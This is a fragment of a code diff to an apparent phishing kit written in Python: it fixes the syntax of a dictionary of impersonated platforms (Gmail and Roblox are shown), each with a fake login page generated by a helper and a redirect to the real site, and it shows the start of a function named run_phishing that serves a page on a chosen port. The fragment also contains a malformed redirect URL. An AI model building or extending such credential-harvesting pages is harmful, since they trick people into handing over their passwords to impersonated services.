@@ -115,7 +115,7 @@ def generate_html(title, logo_url, username_placeholder, extra_fields=""):
 </body>
 </html>"""
 
-platforms = {}
+platforms = {
     "Gmail": {
         "redirect": "https://mail.google.com",
         "placeholder": "Email Address",
@@ -170,7 +170,8 @@ platforms = {}
     "redirect": "https:://roblox.com",
     "placeholder": "Email or Username",
     "html": generate_html("Roblox Login", "https://share.google/vRrImIbRp41bgc34l", "Email or Username")
-    }
+  },
+  }
 
 def run_phishing(platform_data, port, platform_name):
     timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
